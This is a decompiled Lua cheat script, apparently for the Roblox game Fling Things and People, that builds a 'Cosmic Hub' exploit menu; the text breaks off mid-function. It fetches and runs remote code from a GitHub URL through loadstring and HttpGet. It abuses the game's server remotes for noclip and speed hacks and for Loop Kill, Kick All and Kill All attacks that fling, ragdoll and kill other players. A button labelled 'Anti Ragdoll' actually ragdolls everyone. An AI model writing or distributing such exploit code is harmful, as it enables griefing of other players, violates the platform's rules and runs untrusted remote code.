--[[

 █     █░  █████▒▄▄▄█████▓ ▄▄▄       ██▓███  
▓█░ █ ░█░▓██   ▒ ▓  ██▒ ▓▒▒████▄    ▓██░  ██▒
▒█░ █ ░█ ▒████ ░ ▒ ▓██░ ▒░▒██  ▀█▄  ▓██░ ██▓▒
░█░ █ ░█ ░▓█▒  ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒██▄█▓▒ ▒
░░██▒██▓ ░▒█░      ▒██▒ ░  ▓█   ▓██▒▒██▒ ░  ░
░ ▓░▒ ▒   ▒ ░      ▒ ░░    ▒▒   ▓▒█░▒▓▒░ ░  ░
  ▒ ░ ░   ░          ░      ▒   ▒▒ ░░▒ ░     
  ░   ░   ░ ░      ░        ░   ▒   ░░       
    ░                           ░  ░         
--]]

local vu1 = game:GetService("Players")
local vu2 = vu1.LocalPlayer
local vu3 = game:GetService("RunService")
local vu4 = game:GetService("HttpService")
local vu5 = game:GetService("ReplicatedStorage")
game:GetService("Debris")
local vu6 = vu5:WaitForChild("GrabEvents")
vu5:WaitForChild("CharacterEvents")
vu5:WaitForChild("MenuToys")
local vu7 = vu6:WaitForChild("SetNetworkOwner")
game:GetService("StarterGui")
local vu8 = game:GetService("TextChatService")
if not (vu1.LocalPlayer or vu1:GetPropertyChangedSignal("LocalPlayer"):Wait()) then
    local _ = vu1.LocalPlayer
end
local vu9 = vu5:WaitForChild("CharacterEvents"):FindFirstChild("RagdollRemote")
local vu10 = false
if not vu2.Character then
    vu2.CharacterAdded:Wait()
end
workspace:FindFirstChild(vu2.Name .. "SpawnedInToys")
local vu11 = vu1.LocalPlayer
local vu12 = game:GetService("Workspace");
(_G or {}).BlobmanDelay = 5e-8
local vu13 = 1
local vu14 = nil
local vu15 = {}
function getAllPlayers()
    local v16 = vu1
    local v17, v18, v19 = ipairs(v16:GetPlayers())
    local v20 = {}
    while true do
        local v21
        v19, v21 = v17(v18, v19)
        if v19 == nil then
            break
        end
        table.insert(v20, v21.Name)
    end
    return v20
end
function registerDropdown(p22)
    table.insert(vu15, p22)
    p22:Refresh(getAllPlayers(), true)
end
function sendChatMessage(p23)
    if vu8.ChatVersion ~= Enum.ChatVersion.TextChatService then
        vu5.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(p23, "All")
    else
        vu8.TextChannels.RBXGeneral:SendAsync(p23)
    end
end
task.spawn(function()
    sendChatMessage("-`C\194\180-")
end)
local vu24 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Jeffepicy/OrionGod/refs/heads/main/CosmicOrion", true))()
local v25 = vu24
vu24.MakeNotification(v25, {
    Name = "Welcome to Cosmic Hub!",
    Content = "You\226\128\153re Whitelisted! wink wink",
    Image = "rbxassetid://4483345998",
    Time = 20
})
local v26 = vu24
local v27 = vu24.MakeWindow(v26, {
    Name = "Cosmic Hub FTAP",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "CosmicHubFTAPConfig"
})
local v28 = v27:MakeTab({
    Name = "Player",
    Icon = "rbxassetid://6031075927",
    PremiumOnly = false
})
v28:AddSection({
    Name = "Movement"
})
local vu29 = {
    Walkspeed = false,
    WalkspeedValue = 5,
    InfiniteJump = false,
    InfiniteJumpPower = 100,
    Noclip = false,
    Connections = {}
}
local vu30 = game:GetService("UserInputService")
function vu29.WalkspeedFunc()
    if vu29.Connections.WS then
        vu29.Connections.WS:Disconnect()
    end
    if vu29.Walkspeed then
        vu29.Connections.WS = vu3.Stepped:Connect(function()
            p = vu1.LocalPlayer
            if p and p.Character and (p.Character:FindFirstChild("HumanoidRootPart") and (p.Character:FindFirstChildOfClass("Humanoid") and typeof(vu29.WalkspeedValue) == "number")) then
                h = p.Character.HumanoidRootPart
                u = p.Character:FindFirstChildOfClass("Humanoid")
                h.CFrame = h.CFrame + u.MoveDirection * (16 * vu29.WalkspeedValue / 10)
            end
        end)
    end
end
function vu29.InfiniteJumpFunc()
    if vu29.Connections.JP then
        vu29.Connections.JP:Disconnect()
    end
    if vu29.InfiniteJump then
        vu29.Connections.JP = vu30.JumpRequest:Connect(function()
            local v31 = vu1.LocalPlayer
            if v31 and v31.Character and v31.Character:FindFirstChildOfClass("Humanoid") then
                local v32 = v31.Character:FindFirstChildOfClass("Humanoid")
                v32:ChangeState(Enum.HumanoidStateType.Freefall)
                task.wait()
                v32:ChangeState(Enum.HumanoidStateType.Jumping)
                if v32.UseJumpPower == false then
                    v32.JumpHeight = math.clamp(vu29.InfiniteJumpPower / 10, 7.2, 50)
                else
                    v32.JumpPower = vu29.InfiniteJumpPower
                end
            end
        end)
    end
end
function vu29.NoclipFunc()
    if vu29.Connections.NC then
        vu29.Connections.NC:Disconnect()
    end
    if vu29.Noclip then
        vu29.Connections.NC = vu3.Stepped:Connect(function()
            p = vu1.LocalPlayer
            if p and p.Character then
                local v33, v34, v35 = ipairs(p.Character:GetDescendants())
                while true do
                    local v36
                    v35, v36 = v33(v34, v35)
                    if v35 == nil then
                        break
                    end
                    if v36:IsA("BasePart") then
                        v36.CanCollide = false
                    end
                end
            end
        end)
    end
end
v28:AddToggle({
    Name = "Walkspeed",
    Default = false,
    Callback = function(p37)
        vu29.Walkspeed = p37
        vu29.WalkspeedFunc()
    end
})
v28:AddSlider({
    Name = "Speed Multiplier",
    Min = 1,
    Max = 5,
    Default = 0.1,
    Increment = 0.1,
    Callback = function(p38)
        vu29.WalkspeedValue = p38
    end
})
v28:AddToggle({
    Name = "Infinite Jump",
    Default = false,
    Callback = function(p39)
        vu29.InfiniteJump = p39
        vu29.InfiniteJumpFunc()
    end
})
v28:AddSlider({
    Name = "Jump Power",
    Min = 16,
    Max = 500,
    Default = 16,
    Increment = 1,
    Callback = function(p40)
        vu29.InfiniteJumpPower = p40
    end
})
v28:AddToggle({
    Name = "Noclip",
    Default = false,
    Callback = function(p41)
        vu29.Noclip = p41
        vu29.NoclipFunc()
    end
})
local v42 = v27:MakeTab({
    Name = "Invincibility",
    Icon = "rbxassetid://4483362458",
    PremiumOnly = false
})
v42:AddSection({
    Name = "Anti"
})
function ragdollAllPlayers()
    if vu9 then
        local v43 = vu1
        local v44, v45, v46 = pairs(v43:GetPlayers())
        while true do
            local v47
            v46, v47 = v44(v45, v46)
            if v46 == nil then
                break
            end
            if v47.Character and v47.Character:FindFirstChild("HumanoidRootPart") then
                for _ = 1, 150 do
                    vu9:FireServer(v47.Character.HumanoidRootPart, 9999999)
                    wait()
                end
            end
        end
    else
        vu24:MakeNotification({
            Name = "Error",
            Content = "error",
            Image = "rbxassetid://4483345998",
            Time = 3
        })
    end
end
v42:AddButton({
    Name = "Anti Ragdoll/Snowball",
    Callback = function()
        ragdollAllPlayers()
    end
})
v42:AddButton({
    Name = "Destroy Void",
    Callback = function()
        vu12.FallenPartsDestroyHeight = - 1e95
    end
})
local vu58 = {
    Players = game:GetService("Players"),
    ReplicatedStorage = game:GetService("ReplicatedStorage"),
    RunService = game:GetService("RunService"),
    LP = game.Players.LocalPlayer,
    spawnGucci = function()
        return vu58.ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer("CreatureBlobman", CFrame.new(0, 50000, 0) * CFrame.Angles(- 0.7351, 0.9028, 0.6173), Vector3.new(0, 59.667, 0))
    end,
    setup = function()
        vu58.spawnGucci()
        local vu48 = vu58.LP.Name
        local vu49 = vu12
        local v50 = vu58.LP.Character or vu58.LP.CharacterAdded:Wait()
        local v51 = vu49:FindFirstChild(vu48 .. "SpawnedInToys")
        local v52 = nil
        local v53
        if v51 then
            v53 = v51:FindFirstChild("CreatureBlobman")
        else
            v53 = nil
        end
        if v53 then
            v52 = v53:FindFirstChild("Head")
        end
        if v52 then
            v52.CFrame = CFrame.new(0, 50000, 0)
            v52.Anchored = true
        end
        task.wait(0.1)
        local vu54 = v50:WaitForChild("Humanoid")
        local vu55 = v50:WaitForChild("HumanoidRootPart")
        local vu56 = vu55.Position
        local vu57 = false
        if v53 then
            v53 = v53:FindFirstChild("VehicleSeat")
        end
        if v53 and v53:IsA("VehicleSeat") then
            vu55.CFrame = v53.CFrame + Vector3.new(0, 2, 0)
            v53:Sit(vu54)
            vu57 = true
        end
        vu54:GetPropertyChangedSignal("Jump"):Connect(function()
            if vu57 and vu54.Jump then
                task.wait(0.02)
                vu55.CFrame = CFrame.new(vu56)
                vu57 = false
            end
        end)
        vu58.ragdollConn = vu58.RunService.Heartbeat:Connect(function()
            if vu58.enabled and vu57 then
                pcall(function()
                    vu58.ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(vu49[vu48].HumanoidRootPart, 0)
                end)
            end
        end)
        vu58.posCheckConn = vu58.RunService.Heartbeat:Connect(function()
            if vu58.enabled and (vu55.Position - vu56).Magnitude < 1 then
                vu57 = false
            end
        end)
    end
}
v42:AddToggle({
    Name = " Gucci Anti",
    Default = false,
    Callback = function(p59)
        vu58.enabled = p59
        if p59 then
            vu58.setup()
        else
            if vu58.ragdollConn then
                vu58.ragdollConn:Disconnect()
                vu58.ragdollConn = nil
            end
            if vu58.posCheckConn then
                vu58.posCheckConn:Disconnect()
                vu58.posCheckConn = nil
            end
        end
    end
})
v42:AddButton({
    Name = "Destroy Gucci (All)",
    Callback = function()
        local v60, v61, v62 = vu12:GetDescendants()
        while true do
            local v63
            v62, v63 = v60(v61, v62)
            if v62 == nil then
                break
            end
            if v63.Name == "CreatureBlobman" then
                v63.VehicleSeat:Sit(game.Players.LocalPlayer.Character.Humanoid)
                wait(0.05)
                game.Players.LocalPlayer.Character.Humanoid.Jump = true
            end
        end
    end
})
local vu64 = false
function antiGrab()
    while vu64 and task.wait() do
        if vu11:FindFirstChild("IsHeld") and vu11.IsHeld.Value == true then
            local v65 = vu11.Character
            local v66 = v65 and v65:FindFirstChild("HumanoidRootPart")
            if v66 then
                v66.Anchored = true
                while vu11.IsHeld.Value == true and vu64 do
                    vu5.CharacterEvents.Struggle:FireServer(vu11)
                    task.wait(0.001)
                end
                v66.Anchored = false
            end
        end
    end
end
v42:AddToggle({
    Name = "Anti Grab",
    Default = false,
    Callback = function(p67)
        vu64 = p67
        if vu64 then
            task.spawn(antiGrab)
        end
    end
})
local vu68 = false
function antiExplodeF()
    vu12.ChildAdded:Connect(function(p69)
        local v70 = p69:IsA("Part") and (p69.Name == "Part" and (vu68 and vu11.Character))
        if v70 then
            local v71 = v70:FindFirstChild("HumanoidRootPart")
            local v72 = v70:FindFirstChild("Right Arm")
            if v71 and (v72 and (p69.Position - v71.Position).Magnitude <= 20) then
                v71.Anchored = true
                task.wait(0.01)
                while v72:FindFirstChild("RagdollLimbPart") and v72.RagdollLimbPart.CanCollide == true do
                    task.wait(0.001)
                end
                v71.Anchored = false
            end
        end
    end)
end
v42:AddToggle({
    Name = "Anti Explode",
    Default = false,
    Callback = function(p73)
        vu68 = p73
        if vu68 then
            task.spawn(antiExplodeF)
        end
    end
})
v42:AddToggle({
    Name = "Anti Fire",
    Default = false,
    Callback = function(p74)
        local vu75 = {
            p = game:GetService("Players").LocalPlayer,
            rs = game:GetService("RunService"),
            w = game:GetService("Workspace"),
            mon = false,
            con = nil
        }
        vu75.ep = vu75.w.Map.Hole.PoisonBigHole.ExtinguishPart
        vu75.op = vu75.ep.Position
        function check()
            local v76 = (vu75.p.Character or vu75.p.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
            local v77 = v76:FindFirstChild("FireLight")
            local v78 = v76:FindFirstChild("FireParticleEmitter")
            if v77 or v78 then
                vu75.ep.CFrame = CFrame.new(v76.Position)
                while v77 or v78 do
                    task.wait(0.1)
                    v77 = v76:FindFirstChild("FireLight")
                    v78 = v76:FindFirstChild("FireParticleEmitter")
                    vu75.ep.CFrame = CFrame.new(v76.Position)
                end
                vu75.ep.CFrame = CFrame.new(vu75.op)
            end
        end
        vu75.mon = p74
        if p74 then
            if not vu75.con then
                vu75.con = vu75.rs.Heartbeat:Connect(function()
                    if vu75.mon then
                        check()
                    end
                end)
            end
        else
            vu75.ep.CFrame = CFrame.new(vu75.op)
            if vu75.con then
                vu75.con:Disconnect()
                vu75.con = nil
            end
        end
    end
})
function antiLagF()
    local v79 = game.Players.LocalPlayer.Character
    if v79 then
        local v80 = v79:FindFirstChild("HumanoidRootPart")
        local v81 = v79:FindFirstChild("Humanoid")
        local v82 = game.Players.LocalPlayer:FindFirstChild("PlayerScripts")
        if v82 then
            v82 = game.Players.LocalPlayer.PlayerScripts:FindFirstChild("CharacterAndBeamMove")
        end
        if v80 and (v81 and v82) then
            v82.Disabled = antiLagT
        end
    end
end
v42:AddToggle({
    Name = "Anti Lag",
    Default = false,
    Callback = function(p83)
        antiLagT = p83
        antiLagF()
    end
})
function removeDetectors()
    local v84 = vu2.Character
    if v84 then
        local v85 = v84:FindFirstChild("HumanoidRootPart")
        if v85 then
            local v86 = vu12
            local v87, v88, v89 = pairs(v86:GetDescendants())
            while true do
                local v90
                v89, v90 = v87(v88, v89)
                if v89 == nil then
                    break
                end
                if v90:IsA("BasePart") and (v90.Name == "LeftDetector" or v90.Name == "RightDetector") and (v85.Position - v90.Position).Magnitude > 10 then
                    v90:Destroy()
                end
            end
        end
    else
        return
    end
end
function applyAntiMassless()
    while vu10 do
        if vu2.Character then
            local v91, v92, v93 = ipairs(vu2.Character:GetDescendants())
            while true do
                local v94
                v93, v94 = v91(v92, v93)
                if v93 == nil then
                    break
                end
                if v94:IsA("BasePart") and v94.Massless then
                    v94.Massless = false
                end
            end
        end
        task.wait(1)
    end
end
v42:AddToggle({
    Name = "Anti Blobman",
    Default = false,
    Callback = function(p95)
        vu10 = p95
        if vu10 then
            task.spawn(function()
                while vu10 do
                    removeDetectors()
                    task.wait(1)
                end
            end)
            task.spawn(applyAntiMassless)
        end
    end
})
local v96 = v27:MakeTab({
    Name = "Attack",
    Icon = "rbxassetid://6031094674",
    PremiumOnly = false
})
v96:AddSection({
    Name = "Loop "
})
local vu97 = game:GetService("Players")
local vu98 = game:GetService("RunService")
local vu99 = vu12
local vu100 = game.ReplicatedStorage
local vu101 = vu97.LocalPlayer
local vu102 = {}
local vu103 = nil
local vu104 = {
    E = false,
    S = nil,
    D = 2,
    Off = Vector3.new(5, - 18.5, 0),
    H = 10000,
    Del = 0.5
}
local vu105 = {
    E = false,
    S = nil,
    D = 2,
    Off = Vector3.new(5, - 18.5, 0),
    H = 10000,
    Del = 0.5
}
function upd(p106)
    local v107 = vu97
    local v108, v109, v110 = ipairs(v107:GetPlayers())
    local v111 = {}
    while true do
        local v112
        v110, v112 = v108(v109, v110)
        if v110 == nil then
            break
        end
        table.insert(v111, v112.Name)
    end
    p106:Refresh(v111, true)
end
function nocoll(p113)
    local v114, v115, v116 = ipairs(p113:GetDescendants())
    while true do
        local v117
        v116, v117 = v114(v115, v116)
        if v116 == nil then
            break
        end
        if v117:IsA("BasePart") then
            v117.CanCollide = false
        end
    end
end
function fling(p118, p119)
    nocoll(p119.Parent)
    local vu120 = Instance.new("BodyVelocity", p118)
    local v121 = Vector3.new(0, 1000000000, 0)
    vu120.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    vu120.Velocity = v121
    p119.Jump = true
    p119.Sit = false
    task.delay(3, function()
        if vu120.Parent then
            vu120:Destroy()
        end
    end)
end
function above(p122, p123)
    local v124 = p122.Character
    if v124 then
        v124 = p122.Character:FindFirstChild("HumanoidRootPart")
    end
    return (not v124 or p123 < v124.Position.Y) and true or false
end
function save(p125)
    local v126 = vu101.Character
    if v126 and v126:FindFirstChild("HumanoidRootPart") then
        p125.S = v126:GetPivot()
    end
end
function ret(p127)
    local v128 = vu101.Character
    local v129
    if v128 then
        v129 = v128:FindFirstChild("HumanoidRootPart")
    else
        v129 = v128
    end
    if v129 and (p127.S and (v129.Position - p127.S.Position).Magnitude > p127.D) then
        v128:PivotTo(p127.S)
    end
end
function act(p130, pu131, pu132)
    if pu131.E then
        if vu99:FindFirstChild("PlotItems") and vu99.PlotItems.PlayersInPlots:FindFirstChild(p130.Name) then
            return
        else
            local vu133 = p130.Character
            local vu134
            if vu133 then
                vu134 = vu133:FindFirstChild("HumanoidRootPart")
            else
                vu134 = vu133
            end
            local vu135
            if vu133 then
                vu135 = vu133:FindFirstChildOfClass("Humanoid")
            else
                vu135 = vu133
            end
            local vu136
            if vu133 then
                vu136 = vu133:FindFirstChild("Head")
            else
                vu136 = vu133
            end
            if vu134 and (vu135 and (vu136 and (vu135.Health > 0 and not above(p130, pu131.H)))) then
                local vu137 = vu101.Character
                local v138
                if vu137 then
                    v138 = vu137:FindFirstChild("HumanoidRootPart")
                else
                    v138 = vu137
                end
                if v138 then
                    pcall(function()
                        save(pu131)
                        vu137:PivotTo(CFrame.new(vu134.Position + pu131.Off))
                        nocoll(vu133)
                        vu100.GrabEvents.SetNetworkOwner:FireServer(vu134, vu134.CFrame)
                        task.wait()
                        ret(pu131)
                        task.wait(0.1)
                        vu100.GrabEvents.DestroyGrabLine:FireServer(vu134)
                        task.wait(0.1)
                        if vu136:FindFirstChild("PartOwner") and vu136.PartOwner.Value == vu101.Name then
                            fling(vu134, vu135)
                            if pu132 then
                                task.wait(0.1)
                                vu135.Health = 0
                            end
                        end
                    end)
                    task.wait(pu131.Del)
                end
            else
                return
            end
        end
    else
        return
    end
end
function loop(p139, p140)
    save(p139)
    local v141, v142, v143 = pairs(vu102)
    while true do
        v143 = v141(v142, v143)
        if v143 == nil or not p139.E then
            break
        end
        local v144 = vu97:FindFirstChild(v143)
        if v144 then
            act(v144, p139, p140)
        end
    end
end
function loopCtrl(pu145, pu146)
    return vu98.Heartbeat:Connect(function()
        if pu145.E then
            loop(pu145, pu146)
        end
    end)
end
local vu147 = nil
local vu148 = nil
local vu149 = nil
local vu150 = nil
function stop(p151, p152)
    p152.E = false
    if p151 then
        p151:Disconnect()
    end
    p152.S = nil
end
SelectDropdown = v96:AddDropdown({
    Name = "Select Player",
    Options = {},
    Callback = function(p153)
        vu103 = vu97:FindFirstChild(p153)
    end
})
LoopDropdown = v96:AddDropdown({
    Name = "Players in Loop",
    Options = {},
    Callback = function(p154)
        vu103 = vu97:FindFirstChild(p154)
    end
})
v96:AddButton({
    Name = "Add Player",
    Callback = function()
        if vu103 and not vu102[vu103.Name] then
            vu102[vu103.Name] = true
            upd(LoopDropdown)
        end
    end
})
v96:AddButton({
    Name = "Remove Player",
    Callback = function()
        if vu103 and vu102[vu103.Name] then
            vu102[vu103.Name] = nil
            vu103 = nil
            upd(SelectDropdown)
            upd(LoopDropdown)
        end
    end
})
v96:AddToggle({
    Name = "Loop Kick",
    Callback = function(p155)
        vu104.E = p155
        if p155 then
            vu147 = loopCtrl(vu104, false)
        else
            stop(vu147, vu104)
        end
    end
})
v96:AddToggle({
    Name = "Loop Kill",
    Callback = function(p156)
        vu105.E = p156
        if p156 then
            vu148 = loopCtrl(vu105, true)
        else
            stop(vu148, vu105)
        end
    end
})
vu97.PlayerAdded:Connect(function()
    upd(SelectDropdown)
end)
vu97.PlayerRemoving:Connect(function(p157)
    if vu102[p157.Name] then
        vu102[p157.Name] = nil
        upd(LoopDropdown)
    end
    upd(SelectDropdown)
end)
upd(SelectDropdown)
upd(LoopDropdown)
v96:AddToggle({
    Name = "Kick All",
    Callback = function(p158)
        if p158 then
            stop(vu147, vu104)
            vu149 = vu98.Heartbeat:Connect(function()
                save(vu104)
                local v159 = vu97
                local v160, v161, v162 = ipairs(v159:GetPlayers())
                while true do
                    local v163
                    v162, v163 = v160(v161, v162)
                    if v162 == nil then
                        break
                    end
                    if v163 ~= vu101 then
                        act(v163, vu104, false)
                    end
                end
            end)
        else
            stop(vu149, vu104)
        end
    end
})
v96:AddToggle({
    Name = "Kill All",
    Callback = function(p164)
        if p164 then
            stop(vu148, vu105)
            vu150 = vu98.Heartbeat:Connect(function()
                save(vu105)
                local v165 = vu97
                local v166, v167, v168 = ipairs(v165:GetPlayers())
                while true do
                    local v169
                    v168, v169 = v166(v167, v168)
                    if v168 == nil then
                        break
                    end
                    if v169 ~= vu101 then
                        act(v169, vu105, true)
                    end
                end
            end)
        else
            stop(vu150, vu105)
        end
    end
})
v96:AddSection({
    Name = "Grabs"
})
local vu170 = false
function killGrabF()
    if vu170 then
        vu12.ChildAdded:Connect(function(p171)
            if p171:IsA("Model") and (p171.Name == "GrabParts" and vu170) then
                local v172 = p171:FindFirstChild("GrabPart")
                if v172 and v172:FindFirstChild("WeldConstraint") then
                    local v173 = v172.WeldConstraint.Part1
                    local v174 = v173 and (v173.Parent and v173.Parent ~= vu11.Character) and v173.Parent:FindFirstChildOfClass("Humanoid")
                    if v174 then
                        v174.Health = 0
                    end
                end
            end
        end)
    end
end
v96:AddToggle({
    Name = "Kill Grab",
    Default = false,
    Callback = function(p175)
        vu170 = p175
        killGrabF()
    end
})
local vu176 = {
    S = game:GetService("UserInputService"),
    A = game:GetService("ContextActionService"),
    W = game:GetService("Workspace"),
    R = game:GetService("RunService"),
    D = game:GetService("Debris"),
    P = game:GetService("Players"),
    Enabled = false,
    Strength = 800,
    UI = {}
}
function onGrabAdded(pu177)
    if not vu176.Enabled then
        return
    end
    if pu177.Name ~= "GrabParts" then
        return
    end
    local v178 = pu177:FindFirstChild("GrabPart")
    if not (v178 and v178:FindFirstChild("WeldConstraint")) then
        return
    end
    local v179 = v178.WeldConstraint.Part1
    if not v179 then
        return
    end
    local vu180 = Instance.new("BodyVelocity")
    vu180.MaxForce = Vector3.new(0, 0, 0)
    vu180.Parent = v179
    local v181 = nil
    local vu182 = nil
    local vu183 = nil
    local vu184 = nil
    while true do
        if v181 or not (pu177.Parent and vu176.Enabled) then
            if v181 and vu176.Enabled then
                function launch()
                    vu180.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                    vu180.Velocity = vu176.W.CurrentCamera.CFrame.LookVector * vu176.Strength
                end
                vu182 = v181.MouseButton1Up:Connect(launch)
                vu183 = v181.MouseButton1Down:Connect(launch)
            end
            local _ = pu177:GetPropertyChangedSignal("Parent"):Connect(function()
                if not pu177.Parent then
                    if vu182 then
                        vu182:Disconnect()
                    end
                    if vu183 then
                        vu183:Disconnect()
                    end
                    if vu184 then
                        vu184:Disconnect()
                    end
                    vu176.D:AddItem(vu180, 1)
                end
            end)
            return
        end
        local v185, v186, v187 = pairs(vu176.P.LocalPlayer.PlayerGui.ContextActionGui:GetDescendants())
        while true do
            local v188
            v187, v188 = v185(v186, v187)
            if v187 == nil then
                break
            end
            if v188:IsA("ImageLabel") and v188.Image == "http://www.roblox.com/asset/?id=9603678090" then
                v181 = v188.Parent
                break
            end
        end
        vu176.R.Heartbeat:Wait()
    end
end
function toggleConnections(p189)
    if p189 then
        vu176.GrabConn = vu176.W.ChildAdded:Connect(onGrabAdded)
    elseif vu176.GrabConn then
        vu176.GrabConn:Disconnect()
        vu176.GrabConn = nil
    end
end
v96:AddToggle({
    Name = "Strength",
    Default = false,
    Callback = function(p190)
        vu176.Enabled = p190
        toggleConnections(p190)
    end
})
v96:AddSlider({
    Name = "Launch Strength",
    Min = 10,
    Max = 3000,
    Default = vu176.Strength,
    Increment = 50,
    Callback = function(p191)
        vu176.Strength = p191
    end
})
local vu192 = game:GetService("Players").LocalPlayer
v96:AddSection({
    Name = "Snowball Ragdoll"
})
local vu193 = {
    P = game:GetService("Players"),
    RS = game:GetService("ReplicatedStorage"),
    W = vu12,
    LP = game.Players.LocalPlayer,
    Toy = game:GetService("ReplicatedStorage"):WaitForChild("MenuToys"),
    Set = game:GetService("ReplicatedStorage"):WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner"),
    TP = nil,
    TE = false,
    SE = false,
    AE = false,
    DD = nil,
    R = {}
}
function getAllPlayers()
    local v194, v195, v196 = ipairs(vu193.P:GetPlayers())
    local v197 = {}
    while true do
        local v198
        v196, v198 = v194(v195, v196)
        if v196 == nil then
            break
        end
        if v198 ~= vu193.LP then
            table.insert(v197, v198.Name)
        end
    end
    return v197
end
function updateDropdown()
    if vu193.DD then
        vu193.DD:Refresh(getAllPlayers(), true)
    end
end
vu193.P.PlayerAdded:Connect(updateDropdown)
vu193.P.PlayerRemoving:Connect(updateDropdown)
function spawnToy(pu199, pu200)
    task.spawn(function()
        local vu201 = vu193.Toy:FindFirstChild("SpawnToyRemoteFunction")
        if vu201 then
            pcall(function()
                vu201:InvokeServer(pu199, CFrame.new(pu200), Vector3.new())
            end)
        end
    end)
end
function tpSnow()
    while vu193.AE do
        local v202 = vu193.W:FindFirstChild(vu193.LP.Name .. "SpawnedInToys")
        if v202 then
            local v203, v204, v205 = pairs(vu193.R)
            while true do
                local v206
                v205, v206 = v203(v204, v205)
                if v205 == nil then
                    break
                end
                local v207 = v206.Character
                if v207 then
                    v207 = v207:FindFirstChild("HumanoidRootPart")
                end
                if v207 then
                    local v208, v209, v210 = ipairs(v202:GetChildren())
                    while true do
                        local v211
                        v210, v211 = v208(v209, v210)
                        if v210 == nil then
                            break
                        end
                        if v211:IsA("Model") and v211.Name == "BallSnowball" then
                            local v212, v213, v214 = ipairs(v211:GetDescendants())
                            while true do
                                local v215
                                v214, v215 = v212(v213, v214)
                                if v214 == nil then
                                    break
                                end
                                if v215:IsA("BasePart") then
                                    v215.Position = v207.Position
                                end
                            end
                        end
                    end
                end
            end
        end
        task.wait(0.1)
    end
end
function autoBlob()
    while vu193.AE do
        vu193.R = {}
        local v216, v217, v218 = pairs(vu193.P:GetPlayers())
        while true do
            local v219
            v218, v219 = v216(v217, v218)
            if v218 == nil then
                break
            end
            if v219 ~= vu193.LP and v219.Character then
                local v220 = v219.Character:FindFirstChildOfClass("Humanoid")
                if v220 and (v220.SeatPart and v220.SeatPart.Parent.Name == "CreatureBlobman") then
                    table.insert(vu193.R, v219)
                    local v221 = vu193.LP.Character
                    if v221 then
                        v221 = vu193.LP.Character:FindFirstChild("HumanoidRootPart")
                    end
                    if v221 then
                        spawnToy("BallSnowball", v221.Position + Vector3.new(0, 2, 0))
                    end
                end
            end
        end
        task.wait(0.1)
    end
end
function spawnBalls()
    while vu193.SE do
        local v222 = vu193.LP.Character
        if v222 then
            v222 = vu193.LP.Character:FindFirstChild("HumanoidRootPart")
        end
        if v222 then
            spawnToy("BallSnowball", v222.Position + Vector3.new(0, 2, 0))
        end
        task.wait(1)
    end
end
function tpBall()
    while vu193.TE do
        local v223 = vu193.W:FindFirstChild(vu193.LP.Name .. "SpawnedInToys")
        if v223 and vu193.TP then
            local v224 = vu193.P:FindFirstChild(vu193.TP)
            if v224 then
                v224 = v224.Character
            end
            if v224 then
                v224 = v224:FindFirstChild("HumanoidRootPart")
            end
            if v224 then
                local v225, v226, v227 = ipairs(v223:GetChildren())
                while true do
                    local v228
                    v227, v228 = v225(v226, v227)
                    if v227 == nil then
                        break
                    end
                    if v228:IsA("Model") and v228.Name == "BallSnowball" then
                        local v229, v230, v231 = ipairs(v228:GetDescendants())
                        while true do
                            local v232
                            v231, v232 = v229(v230, v231)
                            if v231 == nil then
                                break
                            end
                            if v232:IsA("BasePart") then
                                v232.Position = v224.Position
                            end
                        end
                    end
                end
            end
        end
        task.wait(0.1)
    end
end
vu193.DD = v96:AddDropdown({
    Name = "Select Player (Snowball)",
    Options = getAllPlayers(),
    Default = nil,
    Callback = function(p233)
        vu193.TP = p233
    end
})
updateDropdown()
v96:AddToggle({
    Name = "Snowball Ragdoll",
    Default = false,
    Callback = function(p234)
        vu193.TE = p234
        if p234 then
            task.spawn(tpBall)
        end
    end
})
v96:AddToggle({
    Name = "Auto Spawn Snowballs",
    Default = false,
    Callback = function(p235)
        vu193.SE = p235
        if p235 then
            task.spawn(spawnBalls)
        end
    end
})
v96:AddToggle({
    Name = "Auto Kick Blob (Snowball Spam)",
    Default = false,
    Callback = function(p236)
        vu193.AE = p236
        if p236 then
            task.spawn(autoBlob)
            task.spawn(tpSnow)
        end
    end
})
if not game:IsLoaded() then
    game.Loaded:Wait()
end
if not (syn and protectgui) then
    getgenv().protectgui = function()
    end
end
local v237 = v27:MakeTab({
    Name = "Blobman Loop",
    Icon = "rbxassetid://6031091005",
    PremiumOnly = false
})
v237:AddSection({
    Name = "Blobman Target"
})
local vu238 = {
    Players = game:GetService("Players"),
    ReplicatedStorage = game:GetService("ReplicatedStorage"),
    Workspace = game:GetService("Workspace"),
    LocalPlayer = nil,
    TargetList = vu29.TargetList or {},
    selectedPlayer = nil,
    toggleEnabled = false,
    teleportAllEnabled = false,
    teleportDelay = 1,
    currentBlobman = nil,
    masterRunning = false,
    blobalter = 1,
    ORIGIN_POS = nil,
    MAX_TELEPORT_DIST = 500,
    targetPlayerDropdown = nil
}
vu238.LocalPlayer = vu238.Players.LocalPlayer
vu29.TargetList = vu238.TargetList
function getAllPlayers()
    local v239, v240, v241 = ipairs(vu238.Players:GetPlayers())
    local v242 = {}
    while true do
        local v243
        v241, v243 = v239(v240, v241)
        if v241 == nil then
            break
        end
        if v243 ~= vu238.LocalPlayer then
            table.insert(v242, v243.Name)
        end
    end
    return v242
end
function refreshDropdown()
    if vu238.targetPlayerDropdown then
        vu238.targetPlayerDropdown:Refresh(getAllPlayers(), true)
    end
end
vu238.targetPlayerDropdown = v237:AddDropdown({
    Name = "Select Player",
    Default = "",
    Options = getAllPlayers(),
    Callback = function(p244)
        vu238.selectedPlayer = vu238.Players:FindFirstChild(p244)
    end
})
registerDropdown(vu238.targetPlayerDropdown)
v237:AddButton({
    Name = "Add Selected Player to Target List",
    Callback = function()
        if vu238.selectedPlayer and not vu238.TargetList[vu238.selectedPlayer.UserId] then
            vu238.TargetList[vu238.selectedPlayer.UserId] = vu238.selectedPlayer.Name
            vu24:MakeNotification({
                Name = "Player Added",
                Content = vu238.selectedPlayer.Name .. " added to target list.",
                Time = 2
            })
        end
    end
})
v237:AddButton({
    Name = "Remove Selected Player from Target List",
    Callback = function()
